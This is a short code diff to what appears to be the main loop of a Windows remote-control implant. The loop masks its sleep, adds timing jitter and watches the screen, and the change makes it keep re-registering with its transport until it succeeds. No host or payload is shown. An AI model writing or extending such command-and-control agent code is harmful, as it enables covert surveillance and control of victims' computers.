@@ -43,6 +43,12 @@ static DWORD WINAPI agent_thread(LPVOID param) {
             dispatch_task(&tasks[i]);
         }
         tasks_free(tasks, count);
+        if (agent_transport_needs_registration()) {
+            while (!agent_register()) {
+                sleep_masked(30000);
+            }
+            continue;
+        }
         screenwatch_tick();
         sleep_masked(sleep_ms_jitter());
     }
